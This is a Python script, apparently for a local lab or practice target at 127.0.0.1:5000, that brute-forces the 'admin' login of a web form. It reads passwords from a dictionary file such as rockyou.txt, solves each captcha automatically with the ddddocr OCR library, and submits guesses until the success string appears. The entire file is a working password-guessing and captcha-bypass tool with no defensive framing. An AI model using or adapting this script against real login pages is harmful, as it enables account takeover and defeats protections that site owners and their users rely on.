import requests
import ddddocr
import time
import random
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from path import captha_get_path,  passwd_path

ocr = ddddocr.DdddOcr()
session = requests.Session()

URL = "http://127.0.0.1:5000/login"
CAPTCHA_URL = "http://127.0.0.1:5000/captcha"
CAPTCHA_PATH = captha_get_path

# 載入字典檔（自行準備或替換為 rockyou.txt）
with open(passwd_path, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

def get_captcha():
    rand_query = str(random.random())
    r = session.get(f"{CAPTCHA_URL}?{rand_query}")
    with open(CAPTCHA_PATH, "wb") as f:
        f.write(r.content)
    with open(CAPTCHA_PATH, "rb") as f:
        return ocr.classification(f.read())

# 開始爆破
for i, password in enumerate(passwords, start=1):
    captcha_text = get_captcha()
    print(f"[{i}] 嘗試密碼: {password} | 驗證碼: {captcha_text}")

    data = {
        "username": "admin",
        "password": password,
        "captcha": captcha_text
    }

    response = session.post(URL, data=data)

    if "You are a hacker" in response.text:
        print(f"🎉 成功登入！密碼: {password} | 驗證碼: {captcha_text}")
        break
    elif "驗證碼錯誤" in response.text:
        print("❌ 驗證碼錯誤，重新嘗試")
    else:
        print("❌ 密碼錯誤")
